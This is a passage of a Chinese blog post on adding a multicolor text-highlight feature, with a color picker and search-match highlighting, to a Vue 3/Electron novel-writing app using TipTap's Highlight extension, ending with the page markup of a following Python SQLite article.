<span class="hljs-keyword">import</span> <span class="hljs-title class_">Highlight</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@tiptap/extension-highlight'</span>

<span class="hljs-comment">// 获取笔记编辑器的扩展配置</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getNoteExtensions</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> [
    <span class="hljs-comment">// ... 其他扩展</span>
    <span class="hljs-title class_">Highlight</span>.<span class="hljs-title function_">configure</span>({
      <span class="hljs-attr">multicolor</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 启用多颜色支持</span>
      <span class="hljs-title class_">HTMLAttributes</span>: {
        <span class="hljs-attr">class</span>: <span class="hljs-string">'search-highlight'</span>  <span class="hljs-comment">// 添加自定义类名</span>
      }
    })
  ]
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/ChapterEditorContent.vue</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Highlight</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@tiptap/extension-highlight'</span>

<span class="hljs-comment">// 获取章节编辑器的扩展配置</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getChapterExtensions</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> [
    <span class="hljs-title class_">StarterKit</span>,
    <span class="hljs-comment">// ... 其他扩展</span>
    <span class="hljs-title class_">Highlight</span>.<span class="hljs-title function_">configure</span>({
      <span class="hljs-attr">multicolor</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 启用多颜色支持</span>
      <span class="hljs-title class_">HTMLAttributes</span>: {
        <span class="hljs-attr">class</span>: <span class="hljs-string">'search-highlight'</span>  <span class="hljs-comment">// 添加自定义类名</span>
      }
    })
  ]
}
</code></pre>
<p><strong>关键配置说明</strong>：</p>
<ul>
<li><code>multicolor: true</code>: 启用多颜色支持，允许为不同的高亮设置不同的颜色</li>
<li><code>HTMLAttributes</code>: 为高亮元素添加自定义 HTML 属性，这里添加了 <code>search-highlight</code> 类名，方便样式控制</li>
</ul>
<h4 data-id="heading-11">2. 高亮颜色定义</h4>
<p>在工具栏组件中定义可用的高亮颜色：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
<span class="hljs-comment">// 高亮颜色选项（5个浅色、亮色）</span>
<span class="hljs-keyword">const</span> highlightColors = [
  { <span class="hljs-attr">value</span>: <span class="hljs-string">'#ffeb3b'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'黄色'</span> },
  { <span class="hljs-attr">value</span>: <span class="hljs-string">'#a8e6cf'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'绿色'</span> },
  { <span class="hljs-attr">value</span>: <span class="hljs-string">'#a8c8ec'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'蓝色'</span> },
  { <span class="hljs-attr">value</span>: <span class="hljs-string">'#ffb3ba'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'粉色'</span> },
  { <span class="hljs-attr">value</span>: <span class="hljs-string">'#dda0dd'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'紫色'</span> }
]
</code></pre>
<p><strong>颜色选择原则</strong>：</p>
<ul>
<li>使用浅色、亮色，确保在白色背景上清晰可见</li>
<li>颜色区分度足够，便于快速识别不同类型的内容</li>
<li>符合视觉设计规范，不会过于刺眼</li>
</ul>
<h4 data-id="heading-12">3. 高亮状态检测</h4>
<p>检测当前选中文本是否已应用高亮，以及使用的颜色：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
<span class="hljs-comment">// 高亮状态（仅笔记编辑器）</span>
<span class="hljs-keyword">const</span> isHighlight = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> isNoteEditor = editorStore.<span class="hljs-property">file</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'note'</span>
  <span class="hljs-keyword">if</span> (isNoteEditor) {
    <span class="hljs-comment">// 笔记编辑器：根据当前选中文本的格式</span>
    <span class="hljs-keyword">return</span> props.<span class="hljs-property">editor</span>.<span class="hljs-title function_">isActive</span>(<span class="hljs-string">'highlight'</span>)
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
})

<span class="hljs-comment">// 检查当前高亮是否使用指定颜色</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isHighlightColorActive</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span> || !isHighlight.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> attrs = props.<span class="hljs-property">editor</span>.<span class="hljs-title function_">getAttributes</span>(<span class="hljs-string">'highlight'</span>)
  <span class="hljs-comment">// 如果没有 color 属性，默认是黄色</span>
  <span class="hljs-keyword">const</span> currentColor = attrs.<span class="hljs-property">color</span> || <span class="hljs-string">'#ffeb3b'</span>
  <span class="hljs-keyword">return</span> currentColor === color
}
</code></pre>
<p><strong>状态检测逻辑</strong>：</p>
<ul>
<li>使用 <code>editor.isActive('highlight')</code> 检测当前选中文本是否已应用高亮</li>
<li>使用 <code>editor.getAttributes('highlight')</code> 获取高亮的属性，包括颜色</li>
<li>如果没有颜色属性，默认使用黄色（<code>#ffeb3b</code>）</li>
</ul>
<h3 data-id="heading-13">🎨 高亮颜色选择器</h3>
<h4 data-id="heading-14">1. 颜色选择器 UI 实现</h4>
<p>使用 Element Plus 的 Popover 组件实现颜色选择器：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- src/renderer/src/components/EditorMenubar.vue --&gt;
&lt;el-popover
  v-if="isNoteEditor"
  v-model:visible="highlightPopoverVisible"
  placement="bottom"
  :width="230"
  trigger="click"
  popper-style="padding: 6px;"
&gt;
  &lt;template #reference&gt;
    &lt;el-button
      size="small"
      class="toolbar-item"
      :type="isHighlight ? 'primary' : 'default'"
      title="高亮"
    &gt;
      &lt;SvgIcon name="highlight" :size="12" /&gt;
    &lt;/el-button&gt;
  &lt;/template&gt;
  &lt;div class="highlight-color-picker"&gt;
    &lt;div class="highlight-colors"&gt;
      &lt;!-- 颜色选项 --&gt;
      &lt;div
        v-for="color in highlightColors"
        :key="color.value"
        class="highlight-color-item"
        :class="{ active: isHighlightColorActive(color.value) }"
        :title="color.label"
        @click="applyHighlight(color.value)"
      &gt;
        &lt;div
          :style="{ backgroundColor: color.value }"
          class="hightlight-color-item-main"
        &gt;&lt;/div&gt;
      &lt;/div&gt;
      &lt;!-- 分隔线 --&gt;
      &lt;div class="highlight-color-split"&gt;&lt;/div&gt;
      &lt;!-- 移除高亮选项 --&gt;
      &lt;div
        :class="{ active: !isHighlight }"
        class="highlight-color-item highlight-color-none"
        title="无高亮"
      &gt;
        &lt;SvgIcon
          class="hightlight-color-item-main"
          :size="20"
          name="ban"
          @click="removeHighlight"
        /&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/el-popover&gt;
</code></pre>
<h4 data-id="heading-15">2. 颜色选择器样式</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
<span class="hljs-selector-class">.highlight-colors</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-wrap</span>: wrap;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">4px</span>;
}

<span class="hljs-selector-class">.highlight-color-item</span> {
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.2s</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">flex-shrink</span>: <span class="hljs-number">0</span>;

  <span class="hljs-selector-class">.hightlight-color-item-main</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
    <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid transparent;
  }

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.15</span>);
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#e3e3e3</span>;
    <span class="hljs-selector-class">.hightlight-color-item-main</span> {
      <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
    }
  }

  &amp;<span class="hljs-selector-class">.active</span> {
    <span class="hljs-attribute">background</span>: <span class="hljs-number">#e3e3e3</span>;
    <span class="hljs-selector-class">.hightlight-color-item-main</span> {
      <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">var</span>(--el-color-primary);
    }
  }
}

<span class="hljs-selector-class">.highlight-color-split</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">1px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">15px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#999</span>;
}
</code></pre>
<p><strong>样式设计要点</strong>：</p>
<ul>
<li>圆形颜色块，视觉清晰</li>
<li>悬停和激活状态的视觉反馈</li>
<li>平滑的过渡动画</li>
<li>响应式布局，适配不同屏幕</li>
</ul>
<h4 data-id="heading-16">3. 应用高亮颜色</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
<span class="hljs-comment">// 应用高亮颜色</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">applyHighlight</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> isNoteEditor = editorStore.<span class="hljs-property">file</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'note'</span>
  <span class="hljs-keyword">if</span> (isNoteEditor) {
    <span class="hljs-comment">// 使用 setHighlight 确保应用正确的颜色</span>
    props.<span class="hljs-property">editor</span>.<span class="hljs-title function_">chain</span>().<span class="hljs-title function_">focus</span>().<span class="hljs-title function_">setHighlight</span>({ color }).<span class="hljs-title function_">run</span>()
    highlightPopoverVisible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  }
}

<span class="hljs-comment">// 移除高亮</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removeHighlight</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span>) <span class="hljs-keyword">return</span>
  <span class="hljs-keyword">const</span> isNoteEditor = editorStore.<span class="hljs-property">file</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'note'</span>
  <span class="hljs-keyword">if</span> (isNoteEditor) {
    props.<span class="hljs-property">editor</span>.<span class="hljs-title function_">chain</span>().<span class="hljs-title function_">focus</span>().<span class="hljs-title function_">unsetHighlight</span>().<span class="hljs-title function_">run</span>()
    highlightPopoverVisible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  }
}
</code></pre>
<p><strong>命令执行逻辑</strong>：</p>
<ul>
<li><code>editor.chain().focus()</code>: 确保编辑器获得焦点</li>
<li><code>.setHighlight({ color })</code>: 为选中文本应用指定颜色的高亮</li>
<li><code>.unsetHighlight()</code>: 移除选中文本的高亮</li>
<li><code>.run()</code>: 执行命令链</li>
</ul>
<h3 data-id="heading-17">🔍 搜索高亮集成</h3>
<h4 data-id="heading-18">1. 搜索高亮实现</h4>
<p>搜索功能也使用 Highlight 扩展来高亮匹配项，当前匹配项使用蓝色，其他匹配项使用黄色：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/SearchPanel.vue</span>
<span class="hljs-comment">// 为所有匹配项添加视觉高亮</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addVisualHighlights</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span> || matches.<span class="hljs-property">value</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 清除之前的高亮</span>
  <span class="hljs-title function_">clearVisualHighlights</span>()

  <span class="hljs-comment">// 为每个匹配项添加高亮标记</span>
  matches.<span class="hljs-property">value</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">match, index</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> isCurrent = index === currentMatchIndex.<span class="hljs-property">value</span>

    <span class="hljs-comment">// 使用Tiptap的setMark命令添加高亮</span>
    props.<span class="hljs-property">editor</span>.<span class="hljs-property">commands</span>.<span class="hljs-title function_">setTextSelection</span>({
      <span class="hljs-attr">from</span>: match.<span class="hljs-property">from</span>,
      <span class="hljs-attr">to</span>: match.<span class="hljs-property">to</span>
    })

    <span class="hljs-comment">// 添加高亮标记，使用highlight扩展</span>
    props.<span class="hljs-property">editor</span>.<span class="hljs-property">commands</span>.<span class="hljs-title function_">setHighlight</span>({
      <span class="hljs-attr">color</span>: isCurrent ? <span class="hljs-string">'#409eff'</span> : <span class="hljs-string">'#ffeb3b'</span>
    })
  })

  <span class="hljs-comment">// 恢复当前匹配项的选择</span>
  <span class="hljs-keyword">if</span> (currentMatchIndex.<span class="hljs-property">value</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; currentMatchIndex.<span class="hljs-property">value</span> &lt; matches.<span class="hljs-property">value</span>.<span class="hljs-property">length</span>) {
    <span class="hljs-title function_">highlightMatch</span>(matches.<span class="hljs-property">value</span>[currentMatchIndex.<span class="hljs-property">value</span>])
  }
}

<span class="hljs-comment">// 清除视觉高亮</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">clearVisualHighlights</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span>) <span class="hljs-keyword">return</span>

  <span class="hljs-comment">// 选择整个文档</span>
  props.<span class="hljs-property">editor</span>.<span class="hljs-property">commands</span>.<span class="hljs-title function_">selectAll</span>()

  <span class="hljs-comment">// 移除所有高亮标记</span>
  props.<span class="hljs-property">editor</span>.<span class="hljs-property">commands</span>.<span class="hljs-title function_">unsetHighlight</span>()

  <span class="hljs-comment">// 清除选择</span>
  props.<span class="hljs-property">editor</span>.<span class="hljs-property">commands</span>.<span class="hljs-title function_">setTextSelection</span>(<span class="hljs-number">0</span>)
}
</code></pre>
<p><strong>搜索高亮策略</strong>：</p>
<ul>
<li>当前匹配项使用蓝色（<code>#409eff</code>），突出显示</li>
<li>其他匹配项使用黄色（<code>#409eff</code>），统一标记</li>
<li>切换匹配项时，重新应用所有高亮以更新颜色</li>
</ul>
<h4 data-id="heading-19">2. 搜索高亮与手动高亮的协调</h4>
<p>搜索高亮和手动高亮使用相同的 Highlight 扩展，但通过不同的颜色进行区分：</p>
<ul>
<li>搜索高亮：临时性，仅在搜索时显示，使用蓝色和黄色</li>
<li>手动高亮：持久性，随内容保存，使用5种自定义颜色</li>
</ul>
<h3 data-id="heading-20">🎭 状态管理与交互</h3>
<h4 data-id="heading-21">1. 高亮状态同步</h4>
<p>工具栏按钮的状态需要实时反映当前选中文本的高亮状态：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/renderer/src/components/EditorMenubar.vue</span>
<span class="hljs-comment">// 高亮状态（仅笔记编辑器）</span>
<span class="hljs-keyword">const</span> isHighlight = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">editor</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  <span class="hljs-keyword">const</span> isNoteEditor = editorStore.<span class="hljs-property">file</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'note'</span>
  <span class="hljs-keyword">if</span> (isNoteEditor) {
    <span class="hljs-comment">// 笔记编辑器：根据当前选中文本的格式</span>
    <span class="hljs-keyword">return</span> props.<span class="hljs-property">editor</span>.<span class="hljs-title function_">isActive</span>(<span class="hljs-string">'highlight'</span>)
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
})
</code></pre>
<p><strong>状态同步机制</strong>：</p>
<ul>
<li>使用 Vue 3 的 <code>computed</code> 响应式计算属性</li>
<li>基于 TipTap 编辑器的 <code>isActive()</code> 方法检测状态</li>
<li>当用户选择不同文本时，状态自动更新</li>
</ul>
<h4 data-id="heading-22">2. 交互优化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 应用高亮后自动关闭颜色选择器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">applyHighlight</span>(<span class="hljs-params">color</span>) {
  <span class="hljs-comment">// ... 应用高亮逻辑</span>
  highlightPopoverVisible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment">// 关闭弹窗</span>
}

<span class="hljs-comment">// 移除高亮后自动关闭颜色选择器</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">removeHighlight</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ... 移除高亮逻辑</span>
  highlightPopoverVisible.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>  <span class="hljs-comment">// 关闭弹窗</span>
}
</code></pre>
<p><strong>交互优化要点</strong>：</p>
<ul>
<li>选择颜色后自动关闭弹窗，减少操作步骤</li>
<li>按钮状态实时反映当前选中文本的高亮状态</li>
<li>颜色选择器中的当前颜色高亮显示</li>
</ul>
<h3 data-id="heading-23">🎨 样式渲染与优化</h3>
<h4 data-id="heading-24">1. TipTap Highlight 扩展的样式渲染</h4>
<p>TipTap 的 Highlight 扩展通过内联样式设置背景色，确保颜色正确显示：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// src/renderer/src/components/EditorPanel.vue</span>
<span class="hljs-comment">// Tiptap highlight扩展的样式（支持多颜色）</span>
<span class="hljs-comment">// 确保有 data-color 属性的 mark 元素使用 TipTap 扩展设置的颜色</span>
<span class="hljs-comment">// TipTap 扩展会通过内联 style 设置 background-color，优先级高于类选择器</span>
</code></pre>
<p><strong>样式渲染机制</strong>：</p>
<ul>
<li>TipTap 扩展通过内联 <code>style</code> 属性设置 <code>background-color</code></li>
<li>内联样式优先级高于 CSS 类选择器</li>
<li>支持多颜色，每种颜色独立渲染</li>
</ul>
<h4 data-id="heading-25">2. 高亮样式优化</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 搜索高亮样式 - 使用选择高亮</span>
<span class="hljs-selector-pseudo">::selection</span> {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#409eff</span>;
  <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<p><strong>样式优化策略</strong>：</p>
<ul>
<li>使用内联样式确保颜色准确显示</li>
<li>保持高亮颜色与文本颜色的良好对比度</li>
<li>避免过度装饰，保持简洁美观</li>
</ul>
<h3 data-id="heading-26">🎯 技术亮点总结</h3>
<h4 data-id="heading-27">1. 多颜色高亮支持</h4>
<ul>
<li><strong>灵活的颜色系统</strong>: 支持5种颜色，满足不同分类需求</li>
<li><strong>颜色持久化</strong>: 高亮颜色随内容一起保存和加载</li>
<li><strong>状态同步</strong>: 工具栏按钮状态实时反映当前高亮状态</li>
</ul>
<h4 data-id="heading-28">2. 搜索与高亮集成</h4>
<ul>
<li><strong>统一技术方案</strong>: 搜索高亮和手动高亮使用相同的扩展</li>
<li><strong>颜色区分</strong>: 通过不同颜色区分搜索高亮和手动高亮</li>
<li><strong>动态更新</strong>: 搜索匹配项切换时，高亮颜色自动更新</li>
</ul>
<h4 data-id="heading-29">3. 用户体验优化</h4>
<ul>
<li><strong>直观的颜色选择器</strong>: 圆形颜色块，视觉清晰</li>
<li><strong>即时反馈</strong>: 应用高亮后立即显示效果</li>
<li><strong>操作便捷</strong>: 一键应用或移除高亮</li>
</ul>
<h4 data-id="heading-30">4. 技术架构优势</h4>
<ul>
<li><strong>基于 TipTap 扩展</strong>: 利用成熟的富文本编辑器框架</li>
<li><strong>响应式状态管理</strong>: 基于 Vue 3 的响应式系统</li>
<li><strong>模块化设计</strong>: 高亮功能独立封装，易于维护</li>
</ul>
<h3 data-id="heading-31">🔮 总结与展望</h3>
<p>本文详细介绍了在小说写作软件的笔记编辑器中实现文本高亮功能的技术方案。通过 TipTap 的 Highlight 扩展、Vue 3 的响应式系统以及精心设计的交互逻辑，我们实现了一个功能完善、用户体验优秀的多颜色文本高亮功能。</p>
<h4 data-id="heading-32">技术优势</h4>
<ul>
<li>✅ <strong>多颜色支持</strong>: 5种颜色满足不同分类需求</li>
<li>✅ <strong>状态同步</strong>: 工具栏状态实时反映高亮状态</li>
<li>✅ <strong>搜索集成</strong>: 搜索功能与高亮功能无缝集成</li>
<li>✅ <strong>用户友好</strong>: 直观的颜色选择器，操作便捷</li>
</ul>
<h4 data-id="heading-33">未来优化方向</h4>
<ul>
<li>🔮 <strong>更多颜色</strong>: 支持自定义颜色选择器</li>
<li>🔮 <strong>高亮分类</strong>: 为不同颜色添加标签和说明</li>
<li>🔮 <strong>批量操作</strong>: 支持批量应用或移除高亮</li>
<li>🔮 <strong>导出支持</strong>: 导出时保留高亮信息</li>
</ul>
<p>通过这套技术方案，我们为小说创作者提供了一个强大而直观的文本标记工具，大大提升了笔记管理和世界观构建的效率。</p>
<hr/>
<h4 data-id="heading-34">📚 相关链接</h4>
<ul>
<li><strong>项目地址</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi" ref="nofollow noopener noreferrer">GitHub - 51mazi</a>，给个 Star 哦~</li>
<li><strong>TipTap 官网</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Ftiptap.dev" target="_blank" title="https://tiptap.dev" ref="nofollow noopener noreferrer">tiptap.dev</a></li>
<li><strong>技术栈</strong>: TipTap + Vue 3 + Electron + Element Plus</li>
</ul>
<h4 data-id="heading-35">🏷️ 标签</h4>
<p><code>#TipTap</code> <code>#文本高亮</code> <code>#Vue3</code> <code>#Electron</code> <code>#小说写作</code> <code>#富文本编辑</code> <code>#前端开发</code> <code>#用户体验</code></p>
<hr/>
<blockquote>
<p>💡 <strong>如果这篇文章对你有帮助，请给个 ⭐️ 支持一下！</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python SQLite多线程、上下文管理器与生成器全面解析]]></title>    <link>https://juejin.cn/post/7575102209605353498</link>    <guid>https://juejin.cn/post/7575102209605353498</guid>    <pubDate>2025-11-22T19:14:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102209605353498" data-draft-id="7575104251866038282" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python SQLite多线程、上下文管理器与生成器全面解析"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-11-22T19:14:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GeekPMAlex"/> <meta itemprop="url" content="https://juejin.cn/user/2326992765334446"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python SQLite多线程、上下文管理器与生成器全面解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2326992765334446/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GeekPMAlex
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T19:14:50.000Z" title="Sat Nov 22 2025 19:14:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag 